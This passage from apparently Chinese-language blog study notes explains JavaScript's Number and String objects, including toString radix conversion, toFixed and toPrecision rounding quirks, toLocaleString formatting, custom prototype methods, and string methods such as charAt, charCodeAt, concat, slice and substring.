<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="literal">true</span>) <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码将布尔值<code>true</code>转为数值<code>1</code>。<code>Number</code>作为工具函数的用法，详见《数据类型转换》一章。</p>
<h4 id="6-2-静态属性"><a href="#6-2-静态属性" class="headerlink" title="6.2 静态属性"></a>6.2 静态属性</h4><p><code>Number</code>对象拥有以下一些静态属性（即直接定义在<code>Number</code>对象上的属性，而不是定义在实例上的属性）。</p>
<ul>
<li><code>Number.POSITIVE_INFINITY</code>：正的无限，指向<code>Infinity</code>。</li>
<li><code>Number.NEGATIVE_INFINITY</code>：负的无限，指向<code>-Infinity</code>。</li>
<li><code>Number.NaN</code>：表示非数值，指向<code>NaN</code>。</li>
<li><code>Number.MIN_VALUE</code>：表示最小的正数（即最接近<code>0</code>的正数，在64位浮点数体系中为<code>5e-324</code>），相应的，最接近<code>0</code>的负数为<code>-Number.MIN_VALUE</code>。</li>
<li><code>Number.MAX_SAFE_INTEGER</code>：表示能够精确表示的最大整数，即<code>9007199254740991</code>。</li>
<li><code>Number.MIN_SAFE_INTEGER</code>：表示能够精确表示的最小整数，即<code>-9007199254740991</code>。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.POSITIVE_INFINITY <span class="comment">// Infinity</span></span><br><span class="line"><span class="built_in">Number</span>.NEGATIVE_INFINITY <span class="comment">// -Infinity</span></span><br><span class="line"><span class="built_in">Number</span>.NaN <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.MAX_VALUE</span><br><span class="line"><span class="comment">// 1.7976931348623157e+308</span></span><br><span class="line"><span class="built_in">Number</span>.MAX_VALUE &lt; <span class="literal">Infinity</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.MIN_VALUE</span><br><span class="line"><span class="comment">// 5e-324</span></span><br><span class="line"><span class="built_in">Number</span>.MIN_VALUE &gt; <span class="number">0</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.MAX_SAFE_INTEGER <span class="comment">// 9007199254740991</span></span><br><span class="line"><span class="built_in">Number</span>.MIN_SAFE_INTEGER <span class="comment">// -9007199254740991</span></span><br></pre></td></tr></table></figure>

<h4 id="6-3-实例方法"><a href="#6-3-实例方法" class="headerlink" title="6.3 实例方法"></a>6.3 实例方法</h4><p><code>Number</code>对象有4个实例方法，都跟将数值转换成指定格式有关。</p>
<h5 id="6-3-1-Number-prototype-toString"><a href="#6-3-1-Number-prototype-toString" class="headerlink" title="6.3.1 Number.prototype.toString()"></a>6.3.1 Number.prototype.toString()</h5><p><code>Number</code>对象部署了自己的<code>toString</code>方法，用来将一个数值转为字符串形式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">10</span>).toString() <span class="comment">// &quot;10&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>toString</code>方法可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">10</span>).toString(<span class="number">2</span>) <span class="comment">// &quot;1010&quot;</span></span><br><span class="line">(<span class="number">10</span>).toString(<span class="number">8</span>) <span class="comment">// &quot;12&quot;</span></span><br><span class="line">(<span class="number">10</span>).toString(<span class="number">16</span>) <span class="comment">// &quot;a&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>10</code>一定要放在括号里，这样表明后面的点表示调用对象属性。如果不加括号，这个点会被 JavaScript 引擎解释成小数点，从而报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">10.</span>toString(<span class="number">2</span>)</span><br><span class="line"><span class="comment">// SyntaxError: Unexpected token ILLEGAL</span></span><br></pre></td></tr></table></figure>
<p>只要能够让 JavaScript 引擎不混淆小数点和对象的点运算符，各种写法都能用。除了为<code>10</code>加上括号，还可以在<code>10</code>后面加两个点，JavaScript 会把第一个点理解成小数点（即<code>10.0</code>），把第二个点理解成调用对象属性，从而得到正确结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">10.</span>.toString(<span class="number">2</span>)</span><br><span class="line"><span class="comment">// &quot;1010&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他方法还包括</span></span><br><span class="line"><span class="number">10</span> .toString(<span class="number">2</span>) <span class="comment">// &quot;1010&quot;</span></span><br><span class="line"><span class="number">10.0</span>.toString(<span class="number">2</span>) <span class="comment">// &quot;1010&quot;</span></span><br></pre></td></tr></table></figure>
<p>这实际上意味着，可以直接对一个小数使用<code>toString</code>方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">10.5</span>.toString() <span class="comment">// &quot;10.5&quot;</span></span><br><span class="line"><span class="number">10.5</span>.toString(<span class="number">2</span>) <span class="comment">// &quot;1010.1&quot;</span></span><br><span class="line"><span class="number">10.5</span>.toString(<span class="number">8</span>) <span class="comment">// &quot;12.4&quot;</span></span><br><span class="line"><span class="number">10.5</span>.toString(<span class="number">16</span>) <span class="comment">// &quot;a.8&quot;</span></span><br></pre></td></tr></table></figure>
<p>通过方括号运算符也可以调用<code>toString</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">10</span>[<span class="string">&#x27;toString&#x27;</span>](<span class="number">2</span>) <span class="comment">// &quot;1010&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>toString</code>方法只能将十进制的数，转为其他进制的字符串。如果要将其他进制的数，转回十进制，需要使用<code>parseInt</code>方法</p>
<h5 id="6-3-2-Number-prototype-toFixed"><a href="#6-3-2-Number-prototype-toFixed" class="headerlink" title="6.3.2 Number.prototype.toFixed()"></a>6.3.2 Number.prototype.toFixed()</h5><p><code>toFixed()</code>方法先将一个数转为指定位数的小数，然后返回这个小数对应的字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">10</span>).toFixed(<span class="number">2</span>) <span class="comment">// &quot;10.00&quot;</span></span><br><span class="line"><span class="number">10.005</span>.toFixed(<span class="number">2</span>) <span class="comment">// &quot;10.01&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>10</code>和<code>10.005</code>先转成2位小数，然后转成字符串。其中<code>10</code>必须放在括号里，否则后面的点会被处理成小数点<br><code>toFixed()</code>方法的参数为小数位数，有效范围为0到100，超出这个范围将抛出 RangeError 错误<br>由于浮点数的原因，小数<code>5</code>的四舍五入是不确定的，使用的时候必须小心。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">10.055</span>).toFixed(<span class="number">2</span>) <span class="comment">// 10.05</span></span><br><span class="line">(<span class="number">10.005</span>).toFixed(<span class="number">2</span>) <span class="comment">// 10.01</span></span><br></pre></td></tr></table></figure>
<h5 id="6-3-3-Number-prototype-toExponential"><a href="#6-3-3-Number-prototype-toExponential" class="headerlink" title="6.3.3 Number.prototype.toExponential()"></a>6.3.3 Number.prototype.toExponential()</h5><p><code>toExponential</code>方法用于将一个数转为科学计数法形式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">10</span>).toExponential()  <span class="comment">// &quot;1e+1&quot;</span></span><br><span class="line">(<span class="number">10</span>).toExponential(<span class="number">1</span>) <span class="comment">// &quot;1.0e+1&quot;</span></span><br><span class="line">(<span class="number">10</span>).toExponential(<span class="number">2</span>) <span class="comment">// &quot;1.00e+1&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1234</span>).toExponential()  <span class="comment">// &quot;1.234e+3&quot;</span></span><br><span class="line">(<span class="number">1234</span>).toExponential(<span class="number">1</span>) <span class="comment">// &quot;1.2e+3&quot;</span></span><br><span class="line">(<span class="number">1234</span>).toExponential(<span class="number">2</span>) <span class="comment">// &quot;1.23e+3&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>toExponential</code>方法的参数是小数点后有效数字的位数，范围为0到100，超出这个范围，会抛出一个 RangeError 错误。</p>
<h5 id="6-3-4-Number-prototype-toPrecision"><a href="#6-3-4-Number-prototype-toPrecision" class="headerlink" title="6.3.4 Number.prototype.toPrecision()"></a>6.3.4 Number.prototype.toPrecision()</h5><p><code>Number.prototype.toPrecision()</code>方法用于将一个数转为指定位数的有效数字。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">12.34</span>).toPrecision(<span class="number">1</span>) <span class="comment">// &quot;1e+1&quot;</span></span><br><span class="line">(<span class="number">12.34</span>).toPrecision(<span class="number">2</span>) <span class="comment">// &quot;12&quot;</span></span><br><span class="line">(<span class="number">12.34</span>).toPrecision(<span class="number">3</span>) <span class="comment">// &quot;12.3&quot;</span></span><br><span class="line">(<span class="number">12.34</span>).toPrecision(<span class="number">4</span>) <span class="comment">// &quot;12.34&quot;</span></span><br><span class="line">(<span class="number">12.34</span>).toPrecision(<span class="number">5</span>) <span class="comment">// &quot;12.340&quot;</span></span><br></pre></td></tr></table></figure>
<p>该方法的参数为有效数字的位数，范围是1到100，超出这个范围会抛出 RangeError 错误。<br>该方法用于四舍五入时不太可靠，跟浮点数不是精确储存有关。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">12.35</span>).toPrecision(<span class="number">3</span>) <span class="comment">// &quot;12.3&quot;</span></span><br><span class="line">(<span class="number">12.25</span>).toPrecision(<span class="number">3</span>) <span class="comment">// &quot;12.3&quot;</span></span><br><span class="line">(<span class="number">12.15</span>).toPrecision(<span class="number">3</span>) <span class="comment">// &quot;12.2&quot;</span></span><br><span class="line">(<span class="number">12.45</span>).toPrecision(<span class="number">3</span>) <span class="comment">// &quot;12.4&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="6-3-5-Number-prototype-toLocaleString"><a href="#6-3-5-Number-prototype-toLocaleString" class="headerlink" title="6.3.5 Number.prototype.toLocaleString()"></a>6.3.5 Number.prototype.toLocaleString()</h5><p><code>Number.prototype.toLocaleString()</code>方法接受一个地区码作为参数，返回一个字符串，表示当前数字在该地区的当地书写形式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">123</span>).toLocaleString(<span class="string">&#x27;zh-Hans-CN-u-nu-hanidec&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;一二三&quot;</span></span><br></pre></td></tr></table></figure>
<p>该方法还可以接受第二个参数配置对象，用来定制指定用途的返回字符串。该对象的<code>style</code>属性指定输出样式，默认值是<code>decimal</code>，表示输出十进制形式。如果值为<code>percent</code>，表示输出百分数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">123</span>).toLocaleString(<span class="string">&#x27;zh-Hans-CN&#x27;</span>, &#123; <span class="attr">style</span>: <span class="string">&#x27;percent&#x27;</span> &#125;)</span><br><span class="line"><span class="comment">// &quot;12,300%&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果<code>style</code>属性的值为<code>currency</code>，则可以搭配<code>currency</code>属性，输出指定格式的货币字符串形式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">123</span>).toLocaleString(<span class="string">&#x27;zh-Hans-CN&#x27;</span>, &#123; <span class="attr">style</span>: <span class="string">&#x27;currency&#x27;</span>, <span class="attr">currency</span>: <span class="string">&#x27;CNY&#x27;</span> &#125;)</span><br><span class="line"><span class="comment">// &quot;￥123.00&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">123</span>).toLocaleString(<span class="string">&#x27;de-DE&#x27;</span>, &#123; <span class="attr">style</span>: <span class="string">&#x27;currency&#x27;</span>, <span class="attr">currency</span>: <span class="string">&#x27;EUR&#x27;</span> &#125;)</span><br><span class="line"><span class="comment">// &quot;123,00 €&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="number">123</span>).toLocaleString(<span class="string">&#x27;en-US&#x27;</span>, &#123; <span class="attr">style</span>: <span class="string">&#x27;currency&#x27;</span>, <span class="attr">currency</span>: <span class="string">&#x27;USD&#x27;</span> &#125;)</span><br><span class="line"><span class="comment">// &quot;$123.00&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果<code>Number.prototype.toLocaleString()</code>省略了参数，则由浏览器自行决定如何处理，通常会使用操作系统的地区设定。注意，该方法如果使用浏览器不认识的地区码，会抛出一个错误。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">123</span>).toLocaleString(<span class="string">&#x27;123&#x27;</span>) <span class="comment">// 出错</span></span><br></pre></td></tr></table></figure>

<h4 id="6-4-自定义方法"><a href="#6-4-自定义方法" class="headerlink" title="6.4 自定义方法"></a>6.4 自定义方法</h4><p>与其他对象一样，<code>Number.prototype</code>对象上面可以自定义方法，被<code>Number</code>的实例继承。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.prototype.add = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span> + x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>[<span class="string">&#x27;add&#x27;</span>](<span class="number">2</span>) <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>上面代码为<code>Number</code>对象实例定义了一个<code>add</code>方法。在数值上调用某个方法，数值会自动转为<code>Number</code>的实例对象，所以就可以调用<code>add</code>方法了。由于<code>add</code>方法返回的还是数值，所以可以链式运算</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.prototype.subtract = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span> - x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>).add(<span class="number">2</span>).subtract(<span class="number">4</span>)</span><br><span class="line"><span class="comment">// 6</span></span><br></pre></td></tr></table></figure>
<p>上面代码在<code>Number</code>对象的实例上部署了<code>subtract</code>方法，它可以与<code>add</code>方法链式调用。<br>我们还可以部署更复杂的方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.prototype.iterate = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;= <span class="built_in">this</span>; i++) &#123;</span><br><span class="line">    result.push(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>).iterate()</span><br><span class="line"><span class="comment">// [0, 1, 2, 3, 4, 5, 6, 7, 8]</span></span><br></pre></td></tr></table></figure>
<p>上面代码在<code>Number</code>对象的原型上部署了<code>iterate</code>方法，将一个数值自动遍历为一个数组。<br>注意，数值的自定义方法，只能定义在它的原型对象<code>Number.prototype</code>上面，数值本身是无法自定义属性的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line">n.x = <span class="number">1</span>;</span><br><span class="line">n.x <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>n</code>是一个原始类型的数值。直接在它上面新增一个属性<code>x</code>，不会报错，但毫无作用，总是返回<code>undefined</code>。这是因为一旦被调用属性，<code>n</code>就自动转为<code>Number</code>的实例对象，调用结束后，该对象自动销毁。所以，下一次调用<code>n</code>的属性时，实际取到的是另一个对象，属性<code>x</code>当然就读不出来。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS标准库-Number对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0021</title>
    <url>/2021/05/14/%E6%89%93%E5%8D%A10021/</url>
    <content><![CDATA[<p><font color=#fcaf17>希望你活得尽兴，而不是过的庆幸</font></p>
<h2 id="JS标准库"><a href="#JS标准库" class="headerlink" title="JS标准库"></a>JS标准库</h2><h3 id="7-String对象"><a href="#7-String对象" class="headerlink" title="7. String对象"></a>7. String对象</h3><h4 id="7-1-概述"><a href="#7-1-概述" class="headerlink" title="7.1 概述"></a>7.1 概述</h4><p><code>String</code>对象是 JavaScript 原生提供的三个包装对象之一，用来生成字符串对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> s1 <span class="comment">// &quot;string&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> s2 <span class="comment">// &quot;object&quot;</span></span><br><span class="line"></span><br><span class="line">s2.valueOf() <span class="comment">// &quot;abc&quot;</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码中，变量<code>s1</code>是字符串，<code>s2</code>是对象。由于<code>s2</code>是字符串对象，<code>s2.valueOf</code>方法返回的就是它所对应的原始字符串。<br>字符串对象是一个类似数组的对象（很像数组，但不是数组）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line"><span class="comment">// String &#123;0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3&#125;</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;abc&#x27;</span>))[<span class="number">1</span>] <span class="comment">// &quot;b&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串<code>abc</code>对应的字符串对象，有数值键（<code>0</code>、<code>1</code>、<code>2</code>）和<code>length</code>属性，所以可以像数组那样取值。<br>除了用作构造函数，<code>String</code>对象还可以当作工具方法使用，将任意类型的值转为字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>(<span class="literal">true</span>) <span class="comment">// &quot;true&quot;</span></span><br><span class="line"><span class="built_in">String</span>(<span class="number">5</span>) <span class="comment">// &quot;5&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码将布尔值<code>true</code>和数值<code>5</code>，分别转换为字符串。</p>
<h4 id="7-2-静态方法"><a href="#7-2-静态方法" class="headerlink" title="7.2 静态方法"></a>7.2 静态方法</h4><h5 id="7-2-1-String-fromCharCode"><a href="#7-2-1-String-fromCharCode" class="headerlink" title="7.2.1 String.fromCharCode()"></a>7.2.1 String.fromCharCode()</h5><p><code>String</code>对象提供的静态方法（即定义在对象本身，而不是定义在对象实例的方法），主要是<code>String.fromCharCode()</code>。该方法的参数是一个或多个数值，代表 Unicode 码点，返回值是这些码点组成的字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.fromCharCode() <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">97</span>) <span class="comment">// &quot;a&quot;</span></span><br><span class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>)</span><br><span class="line"><span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>String.fromCharCode</code>方法的参数为空，就返回空字符串；否则，返回参数对应的 Unicode 字符串。<br>注意，该方法不支持 Unicode 码点大于<code>0xFFFF</code>的字符，即传入的参数不能大于<code>0xFFFF</code>（即十进制的 65535）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">0x20BB7</span>)</span><br><span class="line"><span class="comment">// &quot;ஷ&quot;</span></span><br><span class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">0x20BB7</span>) === <span class="built_in">String</span>.fromCharCode(<span class="number">0x0BB7</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>String.fromCharCode</code>参数<code>0x20BB7</code>大于<code>0xFFFF</code>，导致返回结果出错。<code>0x20BB7</code>对应的字符是汉字<code>𠮷</code>，但是返回结果却是另一个字符（码点<code>0x0BB7</code>）。这是因为<code>String.fromCharCode</code>发现参数值大于<code>0xFFFF</code>，就会忽略多出的位（即忽略<code>0x20BB7</code>里面的<code>2</code>）。<br>这种现象的根本原因在于，码点大于<code>0xFFFF</code>的字符占用四个字节，而 JavaScript 默认支持两个字节的字符。这种情况下，必须把<code>0x20BB7</code>拆成两个字符表示。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">0xD842</span>, <span class="number">0xDFB7</span>)</span><br><span class="line"><span class="comment">// &quot;𠮷&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>0x20BB7</code>拆成两个字符<code>0xD842</code>和<code>0xDFB7</code>（即两个两字节字符，合成一个四字节字符），就能得到正确的结果。码点大于<code>0xFFFF</code>的字符的四字节表示法，由 UTF-16 编码方法决定。</p>
<h4 id="7-3-实例属性"><a href="#7-3-实例属性" class="headerlink" title="7.3 实例属性"></a>7.3 实例属性</h4><h5 id="7-3-1-String-prototype-length"><a href="#7-3-1-String-prototype-length" class="headerlink" title="7.3.1 String.prototype.length"></a>7.3.1 String.prototype.length</h5><p>字符串实例的<code>length</code>属性返回字符串的长度</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.length <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<h4 id="7-4-实例方法"><a href="#7-4-实例方法" class="headerlink" title="7.4 实例方法"></a>7.4 实例方法</h4><h5 id="7-4-1-String-prototype-charAt"><a href="#7-4-1-String-prototype-charAt" class="headerlink" title="7.4.1 String.prototype.charAt()"></a>7.4.1 String.prototype.charAt()</h5><p><code>charAt</code>方法返回指定位置的字符，参数是从<code>0</code>开始编号的位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line"></span><br><span class="line">s.charAt(<span class="number">1</span>) <span class="comment">// &quot;b&quot;</span></span><br><span class="line">s.charAt(s.length - <span class="number">1</span>) <span class="comment">// &quot;c&quot;</span></span><br></pre></td></tr></table></figure>
<p>这个方法完全可以用数组下标替代。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.charAt(<span class="number">1</span>) <span class="comment">// &quot;b&quot;</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>[<span class="number">1</span>] <span class="comment">// &quot;b&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果参数为负数，或大于等于字符串的长度，<code>charAt</code>返回空字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.charAt(-<span class="number">1</span>) <span class="comment">// &quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.charAt(<span class="number">3</span>) <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="7-4-2-String-prototype-charCodeAt"><a href="#7-4-2-String-prototype-charCodeAt" class="headerlink" title="7.4.2 String.prototype.charCodeAt()"></a>7.4.2 String.prototype.charCodeAt()</h5><p><code>charCodeAt()</code>方法返回字符串指定位置的 Unicode 码点（十进制表示），相当于<code>String.fromCharCode()</code>的逆操作。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.charCodeAt(<span class="number">1</span>) <span class="comment">// 98</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>abc</code>的<code>1</code>号位置的字符是<code>b</code>，它的 Unicode 码点是<code>98</code><br>如果没有任何参数，<code>charCodeAt</code>返回首字符的 Unicode 码点</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.charCodeAt() <span class="comment">// 97</span></span><br></pre></td></tr></table></figure>
<p>如果参数为负数，或大于等于字符串的长度，<code>charCodeAt</code>返回<code>NaN</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;abc&#x27;</span>.charCodeAt(-<span class="number">1</span>) <span class="comment">// NaN</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.charCodeAt(<span class="number">4</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>注意，<code>charCodeAt</code>方法返回的 Unicode 码点不会大于<code>65536</code>（<code>0xFFFF</code>），也就是说，只返回两个字节的字符的码点。如果遇到码点大于 <code>65536</code> 的字符（四个字节的字符），必须连续使用两次<code>charCodeAt</code>，不仅读入<code>charCodeAt(i)</code>，还要读入<code>charCodeAt(i+1)</code>，将两个值放在一起，才能得到准确的字符</p>
<h5 id="7-4-3-String-prototype-concat"><a href="#7-4-3-String-prototype-concat" class="headerlink" title="7.4.3 String.prototype.concat()"></a>7.4.3 String.prototype.concat()</h5><p><code>concat</code>方法用于连接两个字符串，返回一个新字符串，不改变原字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> s2 = <span class="string">&#x27;def&#x27;</span>;</span><br><span class="line"></span><br><span class="line">s1.concat(s2) <span class="comment">// &quot;abcdef&quot;</span></span><br><span class="line">s1 <span class="comment">// &quot;abc&quot;</span></span><br></pre></td></tr></table></figure>
<p>该方法可以接受多个参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>.concat(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>) <span class="comment">// &quot;abc&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果参数不是字符串，<code>concat</code>方法会将其先转为字符串，然后再连接</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.concat(one, two, three) <span class="comment">// &quot;123&quot;</span></span><br><span class="line">one + two + three <span class="comment">// &quot;33&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>concat</code>方法将参数先转成字符串再连接，所以返回的是一个三个字符的字符串。作为对比，加号运算符在两个运算数都是数值时，不会转换类型，所以返回的是一个两个字符的字符串</p>
<h5 id="7-4-4-String-prototype-slice"><a href="#7-4-4-String-prototype-slice" class="headerlink" title="7.4.4 String.prototype.slice()"></a>7.4.4 String.prototype.slice()</h5><p><code>slice()</code>方法用于从原字符串取出子字符串并返回，不改变原字符串。它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.slice(<span class="number">0</span>, <span class="number">4</span>) <span class="comment">// &quot;Java&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果省略第二个参数，则表示子字符串一直到原字符串结束。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.slice(<span class="number">4</span>) <span class="comment">// &quot;Script&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.slice(-<span class="number">6</span>) <span class="comment">// &quot;Script&quot;</span></span><br><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.slice(<span class="number">0</span>, -<span class="number">6</span>) <span class="comment">// &quot;Java&quot;</span></span><br><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.slice(-<span class="number">2</span>, -<span class="number">1</span>) <span class="comment">// &quot;p&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果第一个参数大于第二个参数（正数情况下），<code>slice()</code>方法返回一个空字符串</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.slice(<span class="number">2</span>, <span class="number">1</span>) <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h5 id="7-4-5-String-prototype-substring"><a href="#7-4-5-String-prototype-substring" class="headerlink" title="7.4.5 String.prototype.substring()"></a>7.4.5 String.prototype.substring()</h5><p><code>substring</code>方法用于从原字符串取出子字符串并返回，不改变原字符串，跟<code>slice</code>方法很相像。它的第一个参数表示子字符串的开始位置，第二个位置表示结束位置（返回结果不含该位置）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substring(<span class="number">0</span>, <span class="number">4</span>) <span class="comment">// &quot;Java&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果省略第二个参数，则表示子字符串一直到原字符串的结束。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;JavaScript&#x27;</span>.substring(<span class="number">4</span>) <span class="comment">// &quot;Script&quot;</span></span><br></pre></td></tr></table></figure>
<p>如果第一个参数大于第二个参数，<code>substring</code>方法会自动更换两个参数的位置。</p>
